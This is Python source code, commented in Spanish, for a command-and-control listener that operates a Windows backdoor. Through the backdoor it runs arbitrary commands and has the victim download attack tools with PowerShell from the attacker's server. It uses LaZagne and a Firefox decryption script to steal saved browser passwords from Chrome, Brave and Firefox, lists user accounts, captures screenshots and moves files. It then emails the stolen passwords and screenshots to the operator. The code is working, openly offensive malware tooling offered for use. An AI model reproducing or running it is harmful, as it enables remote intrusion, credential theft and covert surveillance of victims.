import socket
import signal
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
import struct
import base64


def signal_handler(sig, frame):
    print("\n[!] Exiting...")
    exit(1)

signal.signal(signal.SIGINT, signal_handler)


class Listener:
    '''
    Clase para escuchar las conexiones entrantes
    y enviar comandos al cliente o backdoor
    '''
    def __init__(self, ip, port):
        '''
        Inicializa la dirección IP y el puerto
        y crea el socket del servidor
        '''    
        self.ip = ip
        self.port = port
        
        self.count_screenshot = 0
        
        # Crea un socket de tipo TCP/IP
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Por si el socket no se cierra correctamente 
        # para que no se quede el puerto ocupado
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # Asocia el socket a la dirección IP y puerto
        self.server_socket.bind((self.ip, self.port))
        
        # Pone el socket en modo de escucha
        self.server_socket.listen()
        
        print("[+] Listening for incoming connections")
        
        # Acepta la conexión entrante 
        # y devuelve el socket del cliente y la dirección del cliente
        self.client_socket, self.client_address = self.server_socket.accept()
        print(f"[+] Connection from {self.client_address}")
        
        
    def send_email(self, subject, body, sender, recipients, password):
        '''
        Función para enviar un email con la información
        del comando ejecutado
        '''
        
        # Crear el mensaje
        msg = MIMEMultipart()
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)
        
        # Añadir el cuerpo del mensaje
        msg.attach(MIMEText(body, 'plain'))
        
        try:
            # Abrir la imagen y añadirla al mensaje
            with open('capture.png', 'rb') as file:
                img = MIMEImage(file.read(), name='image.png')
            msg.attach(img)
                
            # Enviar el email
            with smtplib.SMTP_SSL('smtp.serviciodecorreo.es', 465) as smtp_server:
                smtp_server.login(sender, password)
                smtp_server.send_message(msg)
        except Exception as e:
            with smtplib.SMTP_SSL('smtp.serviciodecorreo.es', 465) as smtp_server:
                smtp_server.login(sender, password)
                smtp_server.send_message(msg)
            
        print("Email sent Successfully!")
    
    
    def run_command(self, command):
        '''
        Ejecuta un comando en el backdoor y devuelve la salida
        '''
        # Envía el comando al cliente o el texto
        self.client_socket.send(command.encode())

        # Recibe la salida del comando ejecutado en el cliente
        # y la devuelve
        return self.client_socket.recv(2048).decode()
    
    
    def get_users(self):
        '''
        Función para obtener los usuarios del sistema
        '''
        
        # Envía el comando al cliente o al backdoor
        # para obtener los usuarios del sistema
        self.client_socket.send(b"net user")

        # Recibe la salida del comando ejecutado en el cliente
        output_command = self.client_socket.recv(2048).decode()
        print(output_command)
        
        self.send_email("List of users", output_command, sender, recipients, password)
    
    
    def send_file(self, file):
        '''
        Función para enviar un archivo al cliente
        haciendo uso de dos comandos
        uno para descargar el archivo en el backdoor y
        otro para moverlo a la carpeta temporal
        '''
        
        # Formatear la cadena y luego convertirla a bytes para el primer comando
        command1 = f"powershell iwr -uri http://{self.ip}/{file} -o {file}".encode()
        self.client_socket.send(command1)
        self.client_socket.recv(2048)

        # Formatear la cadena y luego convertirla a bytes para el segundo comando
        command2 = f"move {file} c:\\temp".encode()
        self.client_socket.send(command2)
        self.client_socket.recv(2048)
        
        print(f"File {file} sent successfully!")
    
    
    def get_firefox(self):
        '''
        Función para obtener las contraseñas de Firefox
        Usando el malware2.py que hace uso de firefox_decrypt.py
        '''
    
        self.send_file("firefox_decrypt.py")
        self.send_file("malware2.py")
        
        self.client_socket.send(b"python c:\\temp\\malware2.py")
        output_command = self.client_socket.recv(2048).decode()        
        
        print(output_command)
    
            
    def get_chrome(self):
        '''
        Función para obtener las contraseñas de Chrome
        Usando Lazagne y enviando las contraseñas por email
        '''
        self.send_file("lazagne.exe")
        self.client_socket.send(b"c:\\temp\\lazagne.exe browsers -chrome")
        output_command = self.client_socket.recv(2048).decode()
        
        print(output_command)
        self.send_email("Chrome pass INFO", output_command, sender, recipients, password)
    
    
    def get_brave(self):
        '''
        Función para obtener las contraseñas de Brave
        Usando Lazagne y enviando las contraseñas por email
        '''
        
        self.send_file("lazagne.exe")
        self.client_socket.send(b"c:\\temp\\lazagne.exe browsers -brave")
        
        # Aumentamos los bytes a recibir para que el texto de
        # la salida del comando no se corte.
        output_command = self.client_socket.recv(8192).decode()
        
        print(output_command)
        self.send_email("Brave pass INFO", output_command, sender, recipients, password)


    def screenshot(self):
        '''
        Función para obtener una captura de pantalla
        Enviando un script powershell al cliente que toma la captura
        y la envía al servidor
        '''
        
        self.send_file("screenshot.ps1")
        self.client_socket.send(b"powershell c:\\temp\\screenshot.ps1")
        output_command = self.client_socket.recv(2048).decode()

        print(output_command)

        # Envía el comando al cliente o al backdoor
        self.client_socket.send(b"screenshot")

        # Recibe primero el tamaño del archivo
        file_size_data = self.client_socket.recv(4)
        file_size = struct.unpack("!I", file_size_data)[0]

        # Recibe el archivo capture.png
        with open("capture.png", "wb") as f:
            bytes_received = 0
            while bytes_received < file_size:
                chunk = self.client_socket.recv(min(file_size - bytes_received, 16384))
                if not chunk:
                    break
                f.write(chunk)
                bytes_received += len(chunk)

        print("Screenshot received successfully!")        
        self.send_email("Screenshot", output_command, sender, recipients, password)
        
    def take_screenshot(self):
        '''
        Función para tomar una captura de pantalla
        '''
        comando = f"screenshot2"
        self.client_socket.send(comando.encode())
        
        # Recibe primero el tamaño del archivo
        file_size_data = self.client_socket.recv(4)
        file_size = struct.unpack("!I", file_size_data)[0]
        
        # Recibe el archivo de captura de pantalla
        with open(f"capture{self.count_screenshot}.png", "wb") as f:
            bytes_received = 0
            while bytes_received < file_size:
                chunk = self.client_socket.recv(min(file_size - bytes_received, 16384))
                if not chunk:
                    break
                f.write(chunk)
                bytes_received += len(chunk)	
            print(f"Screenshot {self.count_screenshot} received successfully!")
        self.count_screenshot += 1


    
    def show_options(self):
        
        # Diccionario con las opciones y descripciones
        # Para el menú de ayuda.
        options = {
            "get users": "Get the list of users and send it by email",
            "get firefox": "Get the firefox passwords and send it by email",
            "get chrome": "Get the chrome passwords and send it by email",
            "get brave": "Get the brave passwords and send it by email",
            "screenshot": "Take a screenshot and send it by email",
            "screen2": "Take a screenshot and save it in the server",
            "upload [file]": "Upload a file to the client",
            "download [file]": "Download a file from the client",
            "cd [directory]": "Change the current directory",
            "exit": "Exit the listener",
            "help": "Show this help message"
        }    
        print("\n\nOptions:\n")
        # Muestra las opciones iterando sobre el diccionario
        for option, description in options.items():
            print(f"   {option}:\t{description}")
            
    def get_file(self, file):
        '''
        Función para descargar un archivo del cliente
        '''
        
        with open(file, "wb") as file_download:
            file_data = self.client_socket.recv(30000)
            file_download.write(base64.b64decode(file_data))
        
        print(f"File {file} downloaded successfully!")
        
      
           
        
    def upload_file(self, file):
        '''
        Función para subir un archivo al cliente
        '''
        try:
            command = f"upload {file}"
            self.client_socket.send(command.encode())
            with open(file, "rb") as file_upload:
                self.client_socket.send(base64.b64encode(file_upload.read()))
            print(f"File {file} uploaded successfully!")
        except Exception as e:
            print(f"Error uploading file: {e}")
        
        
    def download_file(self, file):
        '''
        Función para descargar un archivo del cliente
        '''
        try:
            command = f"download {file}"
            self.client_socket.send(command.encode())
            with open(file, "wb") as file_download:
                file_data = self.client_socket.recv(30000)
                file_download.write(base64.b64decode(file_data))
            print(f"File {file} downloaded successfully!")
        except Exception as e:
            print(f"Error downloading file: {e}")
    
    
   

    
    def run(self):
        '''
        Función para ejecutar el listener
        Y recibir los comandos del atacante
        '''
        current_dir = self.client_socket.recv(1024).decode()    

        while True:
            # Recibe la ruta donde esta el cliente
            command = input(f"{current_dir} #c2> ")
            
            # si cd cambia el directorio
            if command.startswith("cd "):
                self.client_socket.send(command.encode())
                current_dir = self.client_socket.recv(1024).decode()
                
            elif command=="":
                pass
            elif command.startswith("geturl "):
                # Invoca la función download_internet_file para descargar el archivo de internet
                # A partir de la posición 7 del comando que es donde empieza la URL
                self.client_socket.send(command.encode())
            
            elif command.startswith("download "):
                # Invoca la función download_file para descargar el archivo 
                # A partir de la posición 9 del comando que es donde empieza el nombre del archivo
                self.download_file(command[9:])

            elif command.startswith("upload "):
                # Invoca la función upload_file para subir el archivo
                # A partir de la posición 7 del comando que es donde empieza el nombre del archivo
                self.upload_file(command[7:])
            
            elif command == "screenshot2":
                # Invoca la función take_screenshot para tomar una captura de pantalla
                self.take_screenshot()

            elif command == "start":
                # Usa start para iniciar una aplicación en el cliente
                # Y el servidor no se quede esperando a que termine la aplicación
                self.client_socket.send(command.encode())    
            
 
            elif command == "get users":
                self.get_users()
            # Si el comando es "get firefox" se ejecuta la función get_firefox
            elif command == "get firefox":
                self.get_firefox()
            elif command == "get chrome":
                self.get_chrome()
            elif command == "get brave":
                self.get_brave()
            elif command == "screenshot":
                self.screenshot()
            # Comnado help para mostrar las opciones
            elif command == "help":
                self.show_options()
            elif command == "exit":
                print("[!] Exiting...")
                print("[!] Closing the connection...")
                print("[!] Bye, ciao, adios")
                self.client_socket.close()
                break
            else:
                # Ejecuta el comando y recibe la salida
                command_output = self.run_command(command)
                
                print(command_output)
            

if __name__ == "__main__":
    
    
    sender = "youemail@email.com"
    recipients = "[your@email.com]"
    password = "yourpassword"
    ip_server = "192.168.100.51"
    port = 443 # Puerto de escucha del atacante
    
    listener = Listener(ip_server, port)
    listener.run()
    